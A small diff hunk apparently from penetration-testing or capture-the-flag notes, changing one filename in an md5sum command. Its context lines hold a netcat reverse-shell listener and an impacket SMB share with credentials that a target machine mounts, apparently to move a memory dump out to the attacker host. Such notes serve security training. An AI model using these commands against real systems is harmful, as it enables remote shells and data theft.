@@ -79,7 +79,7 @@ rlwrap -cAr nc -nvlp 9001
 host:
 
 smbserver.py share . -username test -password t3st -smb2support
-md5sum Memory.7z
+md5sum MEMORY.7z
 
 target:
 net use \\10.10.14.82\share /user:test t3st
